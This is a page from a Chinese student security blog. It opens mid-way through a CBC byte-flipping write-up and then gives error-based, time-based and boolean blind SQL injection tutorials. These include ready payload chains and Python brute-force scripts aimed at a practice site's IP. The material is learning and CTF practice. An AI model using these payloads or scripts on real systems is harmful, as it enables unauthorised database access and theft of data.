&quot;[*]原始iv和cipher&quot;</span><br><span class="line">print &quot;iv_raw:  &quot; + iv_raw</span><br><span class="line">print &quot;cipher_raw:  &quot; + cipher_raw</span><br><span class="line">print &quot;[*]对cipher解码，进行反转&quot;</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class="line">#a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;xdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;&#125;</span><br><span class="line">#s:2:&#123;s:8:&quot;userna</span><br><span class="line">#me&quot;;s:5:&quot;xdmin&quot;;</span><br><span class="line">#s:8:&quot;password&quot;;s</span><br><span class="line">#:3:&quot;12345&quot;;&#125;</span><br><span class="line">xor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord(&apos;x&apos;) ^ ord(&apos;a&apos;)) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍</span><br><span class="line">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class="line">print &quot;反转后的cipher：&quot; + xor_cipher</span><br></pre></td></tr></table></figure></p>
<p><strong>3 传新参</strong><br>注意这个时候我们就不能把username和password传参过去了，把我们所得到的cipher值和初始的iv值给传过去。<br><img src="../images/11/5.png" alt=""><br><strong>4 修复所更改的数据块</strong><br>这个时候发现我们传的cipher无法正常反序列化，这个时候我们就需要更改iv值来使得cipher能够正常反序列化，原理和上述一致，脚本如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">cipher = &apos;EK9/OgEKt1XNxlpRcDv8+21lIjtzOjU6IntkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&apos;#填写提交后所得的无法反序列化密文</span><br><span class="line">iv = &apos;bR1nkWOLhxJ4rKGJMBF36w%3D%3D&apos;#一开始提交的iv</span><br><span class="line">#cipher = urllib.unquote(cipher)</span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv = &apos;&apos;</span><br><span class="line">right = &apos;a:2:&#123;s:8:&quot;userna&apos;#被损坏前正确的明文</span><br><span class="line">for i in range(16):</span><br><span class="line">    newIv += chr(ord(right[i])^ord(cipher[i])^ord(iv[i])) #这一步相当于把原来iv中不匹配的部分修改过来</span><br><span class="line">print urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure></p>
<p><strong>5 再一次传参</strong><br>把新得到的iv值传入，得到flag<br><img src="../images/11/6.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjjiw7djd000faovec4hz54lc" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-sql注入之报错注入" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/01/sql注入之报错注入/" class="article-date">
  <time class="post-time" datetime="2018-05-01T14:50:37.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">01</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/01/sql注入之报错注入/">sql注入之报错注入</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入是在有返回错误信息的情况下尝试使用的一种注入方式，一般是在使用延时注入之前考虑的，之所以最后归纳是因为它的注入语句实在是太过冗长，而且并没有什么逻辑规律可言，理解起来十分困难。<br>报错注入可以主要可以分为以下几种方式:<br>floor函数报错<br>UpdateXml函数报错<br>extractvalue函数报错<br>后两种方式具有一定的局限性，报错查询的内容长度最长为32位。  </p>
<h3 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h3><p>在如何使用floor()报错注入的时候，应该先理解报错注入语句的意义。主要用到以下几个函数：<br>floor():向下取整<br>rand():生成随机数<br>count():统计结果<br>简单来说就是在查询的时候让其rand()产生不确定的数在使用order by排序时产生报错来返回信息。<br><strong><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener">具体参考这篇文章</a></strong><br>我就直接给出语句：  </p>
<blockquote>
<p><strong>1 数据库</strong> and (select 1 from(select count(<em>),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>2 库名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>3 表名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=数据库名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)  –+<br><strong>4 列名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=表名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>5 字段</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x23,列名,0x3a,列名,0x23) FROM 表名 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+  </p>
</blockquote>
<p>至于其他的语句自己慢慢测试，语句不限这一种，报错注入的成因并不是语句顺序的问题而是在于其逻辑。  </p>
<h3 id="Updataxml报错"><a href="#Updataxml报错" class="headerlink" title="Updataxml报错"></a>Updataxml报错</h3><p>并没有深入学习Mysql语句，所以对Updataxml()这个函数也是不太了解的，直接贴出具体的报错注入语句吧。。。  </p>
<blockquote>
<p><strong>1 数据库</strong> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) –+<br><strong>2 库名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1) –+<br><strong>3 表名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema=库名 limit 0,1),0x7e),1) –+<br><strong>4 列名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name=表名 limit 0,1),0x7e),1) –+<br><strong>5 字段</strong> and updataxml(1,concat(0x7e,(select group_concat(列名) from 表名),0x7e),1) –+  </p>
</blockquote>
<h3 id="Extractvalue报错"><a href="#Extractvalue报错" class="headerlink" title="Extractvalue报错"></a>Extractvalue报错</h3><p>这个函数的原理和上个函数差不多，具体格式如下  </p>
<blockquote>
<p>and extractvalue(1, concat(0x7e, (select database()),0x7e))  –+  </p>
</blockquote>
<p>其他的和上面类似，一一对照就行了  </p>
<h2 id="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"><a href="#sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。" class="headerlink" title="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"></a>sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjjiw7dk8000uaoveq2sp0daa" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-sql注入之时间盲注" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/04/30/sql注入之时间盲注/" class="article-date">
  <time class="post-time" datetime="2018-04-30T08:37:07.000Z" itemprop="datePublished">
    <span class="post-month">4月</span><br/>
    <span class="post-day">30</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/30/sql注入之时间盲注/">sql注入之时间盲注</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>上一种注入方式是在虽然没有回显位，但是正确错误的页面有所不同的，那如果正确页面和错误页面都相同呢？我们这是可以使用<strong>第二种注入–延时注入</strong>来判断我们所要的信息。<br>主要用到的是<strong>sleep()函数</strong>如果前面的语句为真，那么sleep()就会调用，页面回显就会有延迟，不过缺点也很明显，如果网络不好的话，报错注入就会出现误报的情况。<br>一般我们使用</p>
<blockquote>
<p>if(,1,2)<br>case when() then else end   </p>
</blockquote>
<p>这两个条件语句来进行逻辑判断<br>下面这是一个例子<br><img src="../images/9/1.png" alt=""><br>这个网站现在什么都不显示，但是我们可以试试sleep()是否有用。<br><img src="../images/9/2.png" alt=""><br>发现响应时间过长，sleep函数起了作用，接下来我们就可以试着去爆破了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">database = &quot;&quot;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    stime = time.time()</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when(select length(database()) = %d) then sleep(10) else sleep(0) end --+&quot; %(i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if time.time() - stime &gt; 10:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">print length</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(65,123):</span><br><span class="line">        stime = time.time()</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when((select ascii(substr(database(),%d,1)))= %d) then sleep(10) else sleep(0) end --+&quot;%(i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if time.time() - stime &gt; 10:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            break</span><br><span class="line">            print database</span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
<p>爆破出数据库名。接下来的几个语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; and case when(ascii(substr((select table_name from information_schema.tables where table_schema=&quot;edutest&quot; limit 0,1),1,1)) = 65) then sleep(10) else sleep(0) end --+&quot;</span><br><span class="line">........</span><br></pre></td></tr></table></figure></p>
<p>之后和上一次的脚本类似，理解一下自己就能去试试爆破出信息来了。</p>
<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>无力感，什么都做不好，什么都比不过人家，没实力又太骄傲，我可真是个废物。浮躁浮躁，一天都不知道在干些什么，真是糟糕透了。重新学吧，起码要在大二前，拿出一点成绩。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjjiw7dk8000saovefz102qat" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-sql注入之布尔型注入" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/04/29/sql注入之布尔型注入/" class="article-date">
  <time class="post-time" datetime="2018-04-29T04:46:32.000Z" itemprop="datePublished">
    <span class="post-month">4月</span><br/>
    <span class="post-day">29</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/29/sql注入之布尔型注入/">sql注入之布尔型注入</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h2><p>在过滤了union，仅存select这个关键词的时候，或者是返回并没有显示位时，那我们应该如何使用别的查询语句来查询我们所要的信息呢？或者是我们无法看到之前我们需要的回显位了，那么这个时候我们可以考虑<strong>第一种思路—-布尔型注入</strong>。<br>简而言之，布尔型注入就是判断你查询的语句是否为真，再通过夹逼的方式确定那个值是什么。这就需要用到几个函数了。<br>exists():用于检查子查询是否有返回数据。结果是ture或者false<br>ascii():把字符转化成ascii码<br>substr():substr（string string，num start，num length）截断一部分字符串，偏移从1开始，并不是0<br>count():记录出现的次数<br>接下来在实例中讲解一下布尔型注入的基本思路<br><img src="../images/8/1.png" alt=""><br>这里可以试试我们的联合查询是否可以得到我们想要的结果<img src="../images/8/2.png" alt="">在这里发现并不行，根本没有回显位，所以联合查询的方式肯定是不行的。所以我们考虑使用布尔型注入来试试。试了一个最基本的判断。</p>
<blockquote>
<p><a href="http://47.94.13.75/edu/payload/sql/bool.php?id=1%27%20and%20%28select%20length%28database%28%29%29%3E1%29%20--+" target="_blank" rel="noopener">http://47.94.13.75/edu/payload/sql/bool.php?id=1%27%20and%20%28select%20length%28database%28%29%29%3E1%29%20--+</a>  </p>
</blockquote>
<p><img src="../images/8/3.png" alt="">这时发现回显正常页面说明，我们可以判断数据库的第一个字符的ascii码&gt;1，虽然这没什么实际的意义，但是它提示了我们可以使用布尔型注入来试出数据库的名称。直接用脚本跑吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8  </span><br><span class="line">import string  </span><br><span class="line">import requests  </span><br><span class="line">database = &quot;&quot;  </span><br><span class="line">for i in range(1,10):  </span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (select(length(database())&gt;%d)) --+&quot; % (i)  </span><br><span class="line">    r1 = requests.get(url)  </span><br><span class="line">    if &quot;you are in .....&quot; not in r1.content:  </span><br><span class="line">        length = i  </span><br><span class="line">        break  </span><br><span class="line">for i in range(1,length+1):  </span><br><span class="line">    for j in range(65,123):  </span><br><span class="line">        url2 =   &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (select ascii(substr(database(),%d,1))&gt;%d) --+&quot; %(i,j)  </span><br><span class="line">        r2 = requests.get(url2)  </span><br><span class="line">        if &quot;you are in .....&quot; not in r2.content:  </span><br><span class="line">            database = database + chr(j)  </span><br><span class="line">            break  </span><br><span class="line">     length = length + 1  </span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
<p>跑出数据库名称为edutest，然后接着下一步去查询表名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">tb = &quot;&quot;</span><br><span class="line">tablename = []</span><br><span class="line">for i in range(1,10):</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select count(table_name) from information_schema.tables where table_schema=0x65647574657374 ) &gt; %d) --+&quot; % (i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if &quot;you are in .....&quot; not in r1.content:</span><br><span class="line">        number = i</span><br><span class="line">        break</span><br><span class="line">print number  #数据库数量</span><br><span class="line">for i in range(0,number):</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select length(table_name) from information_schema.tables where table_schema=0x65647574657374 limit %d,1) &gt; %d) --+&quot; % (i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if &quot;you are in .....&quot; not in r2.content:</span><br><span class="line">            length = j</span><br><span class="line">            break</span><br><span class="line">    for k in range(1,length+1):</span><br><span class="line">        for m in range(65,123):</span><br><span class="line">                url3 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select ascii(substr(table_name,%d,1)) from information_schema.tables where table_schema=0x65647574657374 limit %d,1) &gt; %d) --+&quot; %(k ,i ,m)</span><br><span class="line">                r3 = requests.get(url3)</span><br><span class="line">                if &quot;you are in .....&quot; not in r3.content:</span><br><span class="line">                    tb = tb + chr(m)</span><br><span class="line">                    break</span><br><span class="line">    tablename.append(tb)</span><br><span class="line">    tb = &quot;&quot; #清除前面的字符串</span><br><span class="line">print tablename</span><br></pre></td></tr></table></figure></p>
<p>得到以下四个数据库的表名  </p>
<blockquote>
<p>[‘admin_logs’, ‘admins’, ‘facebook’, ‘message’]  </p>
</blockquote>
<p>接着继续爆破列名，以admin_logs为例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">cl = &quot;&quot;</span><br><span class="line">columnname = []</span><br><span class="line">for i in range(1,10):</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select count(column_name) from information_schema.columns where table_name=0x61646d696e5f6c6f6773 ) &gt; %d) --+&quot; % (i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if &quot;you are in .....&quot; not in r1.content:</span><br><span class="line">        number = i</span><br><span class="line">        break</span><br><span class="line">print number  #列数</span><br><span class="line">for i in range(0,number):</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select length(column_name) from information_schema.columns where table_name=0x61646d696e5f6c6f6773 limit %d,1) &gt; %d) --+&quot; % (i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if &quot;you are in .....&quot; not in r2.content:</span><br><span class="line">            length = j</span><br><span class="line">            break</span><br><span class="line">    for k in range(1,length+1):</span><br><span class="line">        for m in range(65,123):</span><br><span class="line">                url3 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select ascii(substr(column_name,%d,1)) from information_schema.columns where table_name=0x61646d696e5f6c6f6773 limit %d,1) &gt; %d) --+&quot; %(k ,i ,m)  </span><br><span class="line">                r3 = requests.get(url3)</span><br><span class="line">                if &quot;you are in .....&quot; not in r3.content:</span><br><span class="line">                    cl = cl + chr(m)</span><br><span class="line">                    break</span><br><span class="line">    columnname.append(cl)</span><br><span class="line">    cl = &quot;&quot; #清除前面的字符串</span><br><span class="line">print columnname</span><br></pre></td></tr></table></figure></p>
<p>我们爆破得出下面这几个列名  </p>
<blockquote>
<p>[‘id’, ‘admin’, ‘ip’, ‘addtime’]  </p>
</blockquote>
<p>接着直接查询字段内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">adminname = []</span><br><span class="line">adm = &quot;&quot;</span><br><span class="line">for i in range(99,105): #我测试了一下发现admin有100000个以上，所以在这里就直接爆破第99到104个</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (length((select admin from admin_logs limit %d,1)) &gt; %d) --+&quot; %(i,j)</span><br><span class="line">        r1 = requests.get(url)</span><br><span class="line">        if &quot;you are in .....&quot; not in r1.content:</span><br><span class="line">            length = j</span><br><span class="line">            break</span><br><span class="line">    for k in range(1,length+1):</span><br><span class="line">        for m in range(65,123): #测试了一下不仅仅是A之后的字符</span><br><span class="line">            url2 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (select ascii(substr((select admin from admin_logs limit %d,1),%d,1)) &gt; %d) --+&quot; %(i,k,m)</span><br><span class="line">            r2 = requests.get(url2)</span><br><span class="line">            if &quot;you are in .....&quot; not in r2.content:</span><br><span class="line">                adm = adm + chr(m)</span><br><span class="line">                break</span><br><span class="line">    adminname.append(adm)</span><br><span class="line">    adm = &quot;&quot;</span><br><span class="line">print adminname</span><br></pre></td></tr></table></figure></p>
<p>爆破出用户名</p>
<blockquote>
<p>[‘fgd’, ‘Artgr’, ‘das’, ‘dddddddddddd’, ‘AAAAAA’, ‘vAdcvAcv’]  </p>
</blockquote>
<p>这是最基本的流程，在一些细节的地方还需要多多去尝试，bypass的手段还需要练习。   </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjjiw7djt000oaovep7qaio5j" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">next &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Iuhrey的幻想乡</h1>
    <h2 class="blog-subtitle"></h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>18</strong><br>文章</div></a>
      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
          喜欢啥几把BB的狗骑驴
        </a>
      
        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
          喜欢gay在狗骑驴旁边的狗逼
        </a>
      
        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
          gay里gay气的大黄
        </a>
      
        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
          郁离歌大手子的博客
        </a>
      
        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
          有很多小姐姐的烧包包
        </a>
      
    </div>
  </div>
</div>

  
</aside>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2017 - 2018 Iuhrey<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
      
    </div>
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>



  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>
<script src="/js/script.js"></script>



  </div>
</body>
</html>